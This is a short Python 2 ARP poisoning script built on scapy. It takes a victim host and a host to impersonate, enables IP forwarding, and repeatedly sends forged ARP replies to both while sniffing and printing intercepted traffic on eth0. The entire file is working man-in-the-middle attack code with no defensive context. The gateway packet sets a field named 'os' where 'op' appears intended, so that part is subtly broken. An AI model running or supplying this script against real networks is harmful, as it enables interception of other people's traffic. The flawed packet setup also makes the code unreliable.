#!/usr/bin/python

from scapy.all import *
import sys

if len(sys.argv) != 3:
    print "Usage: arp_poison.py HOST_TO_ATTACK HOST_TO_IMPERSONATE"
    sys.exit(1)


os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


victim_packet = ARP()
victim_packet.op = 2
victim_packet.psrc = sys.argv[2]
victim_packet.pdst = sys.argv[1]
gateway_packet = ARP()
gateway_packet.os = 2
gateway_packet.psrc = sys.argv[1]
gateway_packet.pdst = sys.argv[2]

while True:
    try:
        send(victim_packet, verbose=1)
        send(gateway_packet, verbose=1)
        sniff(iface=("eth0"), count=1, prn=lambda x: x.summary())
    except KeyboardInterrupt:
        break


